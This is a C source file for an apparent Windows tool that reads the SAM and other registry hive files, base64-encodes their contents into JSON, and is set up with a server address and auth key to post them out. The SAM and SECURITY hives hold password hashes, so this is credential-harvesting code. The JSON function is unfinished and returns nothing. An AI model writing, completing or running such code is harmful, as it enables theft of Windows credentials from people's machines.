#include <stdio.h>
#include <windows.h>
#include "common.h"
#include "post.h"

// Default macros in case we didn't build correctly
#ifndef SVL_ADDRESS
    #define SVL_ADDRESS "https://localhost"
#endif

#ifndef SVL_AUTHKEY
    #define SVL_AUTHKEY "NO AUTH KEY"
#endif

// ⭐ RegExport-Specific Configurations. These are the file paths for the root hive KeyNodes. The comments for regexport.c might use some unfamiliar terminology. 
// Check out this document to see what they mean: https://docs.google.com/document/d/15l3jfCYQE5Fd4Z4w4KaEqe7B-SmOlw8OUAaxSRgTeCo/view

#define HKLM_SYSTEM "C:/Windows/System32/config/system"
#define HKLM_SAM "C:/Windows/System32/config/sam"
#define HKLM_SECURITY "C:/Windows/System32/config/security"
#define HKLM_SOFTWARE "C:/Windows/System32/config/software"
#define HKU_UserProfile "C:/profiles/usere"
#define HKUD "C:/Windows/System32/config/default"

/**
 * ⭐ Array of Registry files to export. Use absolute pathing or one of the typedefs.
 * ⭐ You are responsible for setting the array size
 */
#define REG_EXPORTS_SIZE 1
char* REG_EXPORTS[REG_EXPORTS_SIZE] = {HKLM_SAM};

/**
 * Read all the files given in $file_names, and outputs their content in JSON
 * @param file_names An array of file names to read
 * @param size The size of the file_names array
 * @param json_length {Outbound} Pointer that will output length of the JSON string
 * @note By calling this function, you must deallocate json_string
 * @return JSON string
*/
char* spill_file_json(char** file_names, int size, int* json_length)
{
    // Create our JSON string. Let's add a size object to determine the number of items in it.
    int json_size = 1;          // Start with 1 to take into account null terminator
    char* json_string = malloc(json_size);
    strcpy(json_string, "");

    // Add { to beginning of JSON. To do that, we will need to allocate 1 byte.
    json_size++;
    json_string = realloc(json_string, json_size);
    strcat(json_string, "{");

    // First, let's iterate through the files.
    for (int i = 0; i < size; i++)
    {
        FILE* read_file = fopen(file_names[i], "rb");

        if (read_file == NULL || strcmp(file_names[i], "ls_read.exe") == 0)
        {
            continue;
        }

        concat_mem(&json_string, json_size - 1, "\"", 2, &json_size);
        concat_str_mem(&json_string, json_size - 1, file_names[i], strlen(file_names[i]) + 1, &json_size);
        concat_mem(&json_string, json_size - 1, "\":", 3, &json_size);

        // Read the file, and put the needed items into the JSON string. Basically, we want "{File Content}",

        // Remember, we are still dynamically allocating this. Hence, we will need the file size (read: number of chars in file)
        // First, let's get the original file text
        long file_contents_size = get_file_size(read_file);
        char* file_contents = malloc(file_contents_size + 1);       // We will transfer this over via strcat
        fread(file_contents, file_contents_size, 1, read_file);
        file_contents[file_contents_size] = '\0';                   // C doesn't automatically add null terminators to the end of fread, so we should do it manually ourselves

        fclose(read_file);

        // Transferring binary data over JSON is a bit of a pain. Hence, we will encode it in base64
        // The base64 function requires us to preallocate the base64 string size
        int b64_size = base64_size(file_contents_size);
        char* base64_str = malloc(b64_size + 1);            // Add 1 byte for \0
        base64(file_contents, file_contents_size, base64_str);
        base64_str[b64_size] = '\0';

        // Actually write the string here
        concat_mem(&json_string, json_size - 1, "\"", 2, &json_size);
        concat_str_mem(&json_string, json_size - 1, base64_str, b64_size + 1, &json_size);   // Base64 size does not take into account \0, so we add 1
        concat_mem(&json_string, json_size - 1, "\",", 3, &json_size);

        // Garbage collector
        free(file_contents);
        free(base64_str);
    }
}

int main() {
    if (is_admin()) 
    {
        puts("admin perms");
    }
    else 
    {
        puts("no admin perms");
    }

    return 0;
}